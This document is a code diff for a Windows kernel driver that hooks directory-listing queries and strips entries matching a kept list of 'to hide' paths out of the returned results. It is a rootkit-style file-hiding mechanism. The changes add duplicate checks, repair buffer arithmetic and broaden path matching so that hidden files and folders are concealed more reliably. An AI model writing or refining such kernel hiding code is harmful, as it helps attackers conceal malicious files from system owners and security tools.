@@ -64,44 +64,6 @@ public:
     ULONG BufferSize = 0;
     char HideDivider = L'|';
 
-    BOOL AddToHideFile(PUNICODE_STRING NewHideName) {
-        DWORD Count = NewHideName->Length + sizeof(WCHAR);  // Length does not include nullterminator
-        PVOID TempBuffer = NULL;
-        if (HideBuffer != NULL) {
-            TempBuffer = ExAllocatePoolWithTag(NonPagedPool, BufferSize, 'HfTb');
-            if (TempBuffer == NULL) {
-                return FALSE;
-            }
-            RtlCopyMemory(TempBuffer, HideBuffer, BufferSize);
-            ExFreePool(HideBuffer);
-            HideBuffer = ExAllocatePoolWithTag(NonPagedPool, BufferSize + Count + 1, 'HfOl');
-            if (HideBuffer == NULL) {
-                ExFreePool(TempBuffer);
-                return FALSE;
-            }
-            if (HideBuffer != NULL) {
-                RtlCopyMemory(HideBuffer, TempBuffer, BufferSize);
-                ExFreePool(TempBuffer);
-                RtlCopyMemory((PVOID)((ULONG64)HideBuffer + BufferSize), &HideDivider, 1);
-                RtlCopyMemory((PVOID)((ULONG64)HideBuffer + BufferSize + 1), NewHideName->Buffer, Count);
-                BufferSize += 1 + Count;  // Divider + next string
-            }
-            else {
-                return FALSE;
-            }
-        }
-        else {
-            HideBuffer = ExAllocatePoolWithTag(NonPagedPool, Count, 'HfOl');
-            if (HideBuffer == NULL) {
-                return FALSE;
-            }
-            RtlCopyMemory(HideBuffer, NewHideName->Buffer, Count);
-            BufferSize += Count;
-        }
-        HideCount++;
-        return TRUE;
-    }
-
 
     BOOL GetFromHideFile(PUNICODE_STRING HideName, int HideIndex, ULONG* HideOffset) {
         ULONG CurrLength = 0;
@@ -147,6 +109,59 @@ public:
         return TRUE;
     }
 
+    BOOL CheckIfSameExists(PUNICODE_STRING ComparedString) {
+        UNICODE_STRING CurrentName = { 0 };
+        ULONG HideOffset = 0;
+        for (ULONG namei = 0; namei < HideCount; namei++) {
+            if (GetFromHideFile(&CurrentName, namei, &HideOffset) && HideOffset != 0 && CurrentName.Buffer != NULL) {
+                if (general_helpers::CompareUnicodeStringsADD(&CurrentName, ComparedString, 0)) {
+                    return TRUE;
+                }
+            }
+        }
+        return FALSE;
+    }
+
+    BOOL AddToHideFile(PUNICODE_STRING NewHideName) {
+        DWORD Count = NewHideName->Length + sizeof(WCHAR);  // Length does not include nullterminator
+        PVOID TempBuffer = NULL;
+        if (CheckIfSameExists(NewHideName)) {
+            return FALSE;  // Path already exists
+        }
+        if (HideBuffer != NULL) {
+            TempBuffer = ExAllocatePoolWithTag(NonPagedPool, BufferSize, 'HfTb');
+            if (TempBuffer == NULL) {
+                return FALSE;
+            }
+            RtlCopyMemory(TempBuffer, HideBuffer, BufferSize);
+            ExFreePool(HideBuffer);
+            HideBuffer = ExAllocatePoolWithTag(NonPagedPool, BufferSize + Count + sizeof(WCHAR), 'HfOl');
+            if (HideBuffer == NULL) {
+                ExFreePool(TempBuffer);
+                return FALSE;
+            }
+            if (HideBuffer != NULL) {
+                RtlCopyMemory(HideBuffer, TempBuffer, BufferSize);
+                ExFreePool(TempBuffer);
+                RtlCopyMemory((PVOID)((ULONG64)HideBuffer + BufferSize), &HideDivider, sizeof(WCHAR));
+                RtlCopyMemory((PVOID)((ULONG64)HideBuffer + BufferSize + sizeof(WCHAR)), NewHideName->Buffer, Count);
+                BufferSize += sizeof(WCHAR) + Count;  // Divider + next string
+            }
+            else {
+                return FALSE;
+            }
+        }
+        else {
+            HideBuffer = ExAllocatePoolWithTag(NonPagedPool, Count, 'HfOl');
+            if (HideBuffer == NULL) {
+                return FALSE;
+            }
+            RtlCopyMemory(HideBuffer, NewHideName->Buffer, Count);
+            BufferSize += Count;
+        }
+        HideCount++;
+        return TRUE;
+    }
 
     BOOL RemoveFromHideFile(int HideIndex, PUNICODE_STRING RemovedString) {
         UNICODE_STRING Removed = { 0 };
@@ -165,7 +180,7 @@ public:
         if (HideBuffer == NULL || HideCount == 0 || BufferSize == 0) {
             return FALSE;  // Invalid parameters
         }
-        if (!GetFromHideFile(RemovedString, (int)UnsIndex, &NeededOffset) || Removed.Buffer == NULL || Removed.Length == 0 || Removed.MaximumLength == 0) {
+        if (!GetFromHideFile(RemovedString, (int)UnsIndex, &NeededOffset) || RemovedString->Buffer == NULL || RemovedString->Length == 0 || RemovedString->MaximumLength == 0) {
             return FALSE;
         }
         if (HideCount == 1) {
@@ -176,14 +191,14 @@ public:
             return TRUE;
         }
         if (UnsIndex == 0) {
-            TempBuffer = ExAllocatePoolWithTag(NonPagedPool, BufferSize - (Removed.Length + 2 * sizeof(WCHAR)), 'RfHf');  // +2 for dividor and nullterminator
+            TempBuffer = ExAllocatePoolWithTag(NonPagedPool, BufferSize - (RemovedString->Length + 2 * sizeof(WCHAR)), 'RfHf');  // +2 for dividor and nullterminator
             if (TempBuffer == NULL) {
                 return FALSE;
             }
-            RtlCopyMemory(TempBuffer, (PVOID)((ULONG64)HideBuffer + Removed.Length + 2 * sizeof(WCHAR)), BufferSize - (Removed.Length + 2 * sizeof(WCHAR)));
+            RtlCopyMemory(TempBuffer, (PVOID)((ULONG64)HideBuffer + RemovedString->Length + 2 * sizeof(WCHAR)), BufferSize - (RemovedString->Length + 2 * sizeof(WCHAR)));
             ExFreePool(HideBuffer);
             HideBuffer = TempBuffer;
-            BufferSize -= (Removed.Length + 2 * sizeof(WCHAR));
+            BufferSize -= (RemovedString->Length + 2 * sizeof(WCHAR));
             HideCount--;
         }
         else if (UnsIndex == HideCount - 1) {
@@ -198,37 +213,21 @@ public:
             HideCount--;
         }
         else {
-            TempBuffer = ExAllocatePoolWithTag(NonPagedPool, BufferSize - (Removed.Length + 2 * sizeof(WCHAR)), 'RfHf');
+            TempBuffer = ExAllocatePoolWithTag(NonPagedPool, BufferSize - (RemovedString->Length + 2 * sizeof(WCHAR)), 'RfHf');
             if (TempBuffer == NULL) {
                 return FALSE;
             }
             RtlCopyMemory(TempBuffer, HideBuffer, NeededOffset);
-            RtlCopyMemory((PVOID)((ULONG64)TempBuffer + NeededOffset), (PVOID)((ULONG64)HideBuffer + NeededOffset + Removed.Length + 2 * sizeof(WCHAR)), BufferSize - (NeededOffset + Removed.Length + 2 * sizeof(WCHAR)));
+            RtlCopyMemory((PVOID)((ULONG64)TempBuffer + NeededOffset), (PVOID)((ULONG64)HideBuffer + NeededOffset + RemovedString->Length + 2 * sizeof(WCHAR)), BufferSize - (NeededOffset + RemovedString->Length + 2 * sizeof(WCHAR)));
             ExFreePool(HideBuffer);
             HideBuffer = TempBuffer;
-            BufferSize -= (Removed.Length + 2 * sizeof(WCHAR));
+            BufferSize -= (RemovedString->Length + 2 * sizeof(WCHAR));
             HideCount--;
         }
         return TRUE;
     }
 };
 HideFileObject HookHide;
-
-
-DWORD CompareAgainstFiles(PUNICODE_STRING SearchString) {
-    UNICODE_STRING CurrentFile = { 0 };
-    if (SearchString == NULL || SearchString->Buffer == NULL || 
-        SearchString->Buffer[0] == L'.' && (SearchString->Buffer[1] == L'\0' || (SearchString->Buffer[1] == L'.' && SearchString->Buffer[2] == L'\0'))) {
-        return 9999;  // SearchString is current/last directory
-    }
-    for (int ListIndex = 0; ListIndex < sizeof(DefaultFileObjs) / sizeof(const WCHAR*); ListIndex++) {
-        RtlInitUnicodeString(&CurrentFile, DefaultFileObjs[ListIndex]);
-        if (general_helpers::CompareUnicodeStringsADD(&CurrentFile, SearchString, 0)) {
-            return ListIndex;
-        }
-    }
-    return 9999;
-}
 
 
 void SearchForInitialEvilDir(PUNICODE_STRING Name, BOOL* IsRoot, BOOL* IsSame, DWORD Checks) {
@@ -263,11 +262,14 @@ void SearchForInitialEvilDir(PUNICODE_STRING Name, BOOL* IsRoot, BOOL* IsSame, D
 BOOL IsToHideRequest(PUNICODE_STRING RequestedDir, PUNICODE_STRING CurrentFile) {
     UNICODE_STRING CurrentHidden = { 0 };
     ULONG CurrentHideOffs = 0;
+    ULONG CurrentSequence = 0;
     BOOL IsSame = FALSE;
     int BackSlash = -1;
     int DirIndex = 0;
     for (ULONG hiddeni = 0; hiddeni < HookHide.HideCount; hiddeni++) {
-        HookHide.GetFromHideFile(&CurrentHidden, hiddeni, &CurrentHideOffs);
+        if (!HookHide.GetFromHideFile(&CurrentHidden, hiddeni, &CurrentHideOffs)) {
+            continue;  // If get failed there is nothing to search for
+        }
         for (int namei = 0; namei < CurrentHidden.Length / sizeof(WCHAR); namei++) {
             if (CurrentHidden.Buffer[namei] == L'\\') {
                 BackSlash = namei;
@@ -275,9 +277,39 @@ BOOL IsToHideRequest(PUNICODE_STRING RequestedDir, PUNICODE_STRING CurrentFile) 
             }
         }
         if (BackSlash == -1) {
-            if (general_helpers::CompareUnicodeStringsADD(CurrentFile, &CurrentHidden, 0)) {
-                DbgPrintEx(0, 0, "KMDFdriver Hooking - General file name to hide found (directory %wZ, file %wZ)\n", RequestedDir, CurrentFile);
-                return TRUE;  // General file name, block all instances
+            if (CurrentHidden.Length <= RequestedDir->Length) {
+                for (DirIndex = 1; DirIndex < RequestedDir->Length / sizeof(WCHAR); DirIndex++) {
+                    if (CurrentSequence == CurrentHidden.Length / sizeof(WCHAR)) {
+                        if (RequestedDir->Buffer[DirIndex] == L'\\') {
+                            DbgPrintEx(0, 0, "KMDFdriver Hooking - File/folder to hide exists in RequestedDir (FullPath %wZ, RequestedDir %wZ)\n",
+                                &CurrentHidden, RequestedDir);
+                            return TRUE;
+                        }
+                        else {
+                            CurrentSequence = 0;
+                        }
+                    }
+                    else {
+                        if (RequestedDir->Buffer[DirIndex] != CurrentHidden.Buffer[CurrentSequence]) {
+                            CurrentSequence = 0;
+                        }
+                        else {
+                            CurrentSequence++;
+                        }
+                    }
+                }
+                if (CurrentSequence == CurrentHidden.Length / sizeof(WCHAR)) {
+                    DbgPrintEx(0, 0, "KMDFdriver Hooking - File/folder to hide exists at the end of RequestedDir (FullPath %wZ, RequestedDir %wZ)\n",
+                        &CurrentHidden, RequestedDir);
+                    return TRUE;  // Make sure to still check if the end of requested directory includes to hide path/file/folder
+                }
+                CurrentSequence = 0;
+                DirIndex = 0;
+            }
+            if (general_helpers::CompareUnicodeStringsADD(&CurrentHidden, CurrentFile, 0)) {
+                DbgPrintEx(0, 0, "KMDFdriver Hooking - File/folder to hide is the same as CurrentFile (FullPath %wZ, CurrentFile %wZ)\n",
+                    &CurrentHidden, CurrentFile);
+                return TRUE;
             }
             continue;
         }
@@ -301,7 +333,6 @@ BOOL IsToHideRequest(PUNICODE_STRING RequestedDir, PUNICODE_STRING CurrentFile) 
                             &CurrentHidden, RequestedDir);  // Make sure that directories like nosusfolder1 wont get labeled as evil
                         return TRUE;  // Comparison got to the end of RequestDir - until the end, it was equal
                     }
-                    
                 }
                 DirIndex = 0;
                 IsSame = FALSE;
@@ -327,14 +358,16 @@ NTSTATUS IterateOverFiles(FILE_INFORMATION_CLASS FileInfoClass, PVOID FileInform
     PFILE_ID_FULL_DIR_INFORMATION CurrFullId = { 0 };
     PFILE_FULL_DIR_INFORMATION PreviousFull = { 0 };
     PFILE_FULL_DIR_INFORMATION CurrFull = { 0 };
+    PVOID PreviousCurrent = NULL;  // Used to verify if while should end
 
 
     // Cast parameters and call by type:
     switch (FileInfoClass) {
     case FileIdBothDirectoryInformation:
         CurrBothId = (PFILE_ID_BOTH_DIR_INFORMATION)FileInformation;
+        PreviousCurrent = (PVOID)CurrBothId;
         PreviousBothId = CurrBothId;
-        while ((ULONG64)CurrBothId != (ULONG64)PreviousBothId || FileCount == 0) {
+        while ((ULONG64)CurrBothId != (ULONG64)PreviousCurrent || FileCount == 0) {
             CurrBothId->FileIndex -= IndexDecr;
             CurrentFile.Buffer = CurrBothId->FileName;
             CurrentFile.Length = (USHORT)CurrBothId->FileNameLength;
@@ -360,16 +393,20 @@ NTSTATUS IterateOverFiles(FILE_INFORMATION_CLASS FileInfoClass, PVOID FileInform
                 DbgPrintEx(0, 0, "\n-=-=-=-=-=FAKE ENDED=-=-=-=-=-\n\n");
                 IndexDecr++;
             }
-            FileCount++;
-            PreviousBothId = CurrBothId;
+            else {
+                PreviousBothId = CurrBothId;  // If CurrFile was hidden previous needs to stay in place
+            }
+            PreviousCurrent = (PVOID)CurrBothId;
             CurrBothId = (PFILE_ID_BOTH_DIR_INFORMATION)((ULONG64)CurrBothId + CurrBothId->NextEntryOffset);
+            FileCount++;
         }
         break;
 
     case FileBothDirectoryInformation:
         CurrBoth = (PFILE_BOTH_DIR_INFORMATION)FileInformation;
+        PreviousCurrent = (PVOID)CurrBoth;
         PreviousBoth = CurrBoth;
-        while ((ULONG64)CurrBoth != (ULONG64)PreviousBoth || FileCount == 0) {
+        while ((ULONG64)CurrBoth != (ULONG64)PreviousCurrent || FileCount == 0) {
             CurrBoth->FileIndex -= IndexDecr;
             CurrentFile.Buffer = CurrBoth->FileName;
             CurrentFile.Length = (USHORT)CurrBoth->FileNameLength;
@@ -395,16 +432,20 @@ NTSTATUS IterateOverFiles(FILE_INFORMATION_CLASS FileInfoClass, PVOID FileInform
                 DbgPrintEx(0, 0, "\n-=-=-=-=-=FAKE ENDED=-=-=-=-=-\n\n");
                 IndexDecr++;
             }
-            FileCount++;
-            PreviousBoth = CurrBoth;
+            else {
+                PreviousBoth = CurrBoth;  // If CurrFile was hidden previous needs to stay in place
+            }
+            PreviousCurrent = (PVOID)CurrBoth;
             CurrBoth = (PFILE_BOTH_DIR_INFORMATION)((ULONG64)CurrBoth + CurrBoth->NextEntryOffset);
+            FileCount++;
         }
         break;
 
     case FileIdFullDirectoryInformation:
         CurrFullId = (PFILE_ID_FULL_DIR_INFORMATION)FileInformation;
+        PreviousCurrent = (PVOID)CurrFullId;
         PreviousFullId = CurrFullId;
-        while ((ULONG64)CurrFullId != (ULONG64)PreviousFullId || FileCount == 0) {
+        while ((ULONG64)CurrFullId != (ULONG64)PreviousCurrent || FileCount == 0) {
             CurrFullId->FileIndex -= IndexDecr;
             CurrentFile.Buffer = CurrFullId->FileName;
             CurrentFile.Length = (USHORT)CurrFullId->FileNameLength;
@@ -430,16 +471,20 @@ NTSTATUS IterateOverFiles(FILE_INFORMATION_CLASS FileInfoClass, PVOID FileInform
                 DbgPrintEx(0, 0, "\n-=-=-=-=-=FAKE ENDED=-=-=-=-=-\n\n");
                 IndexDecr++;
             }
-            FileCount++;
-            PreviousFullId = CurrFullId;
+            else {
+                PreviousFullId = CurrFullId;  // If CurrFile was hidden previous needs to stay in place
+            }
+            PreviousCurrent = (PVOID)CurrFullId;
             CurrFullId = (PFILE_ID_FULL_DIR_INFORMATION)((ULONG64)CurrFullId + CurrFullId->NextEntryOffset);
+            FileCount++;
         }
         break;
 
     case FileFullDirectoryInformation:
         CurrFull = (PFILE_FULL_DIR_INFORMATION)FileInformation;
+        PreviousCurrent = (PVOID)CurrFull;
         PreviousFull = CurrFull;
-        while ((ULONG64)CurrFull != (ULONG64)PreviousFull || FileCount == 0) {
+        while ((ULONG64)CurrFull != (ULONG64)PreviousCurrent || FileCount == 0) {
             CurrFull->FileIndex -= IndexDecr;
             CurrentFile.Buffer = CurrFull->FileName;
             CurrentFile.Length = (USHORT)CurrFull->FileNameLength;
@@ -465,9 +510,12 @@ NTSTATUS IterateOverFiles(FILE_INFORMATION_CLASS FileInfoClass, PVOID FileInform
                 DbgPrintEx(0, 0, "\n-=-=-=-=-=FAKE ENDED=-=-=-=-=-\n\n");
                 IndexDecr++;
             }
-            FileCount++;
-            PreviousFull = CurrFull;
+            else {
+                PreviousFull = CurrFull;  // If CurrFile was hidden previous needs to stay in place
+            }
+            PreviousCurrent = (PVOID)CurrFull;
             CurrFull = (PFILE_FULL_DIR_INFORMATION)((ULONG64)CurrFull + CurrFull->NextEntryOffset);
+            FileCount++;
         }
         break;
     default: return STATUS_INVALID_PARAMETER;
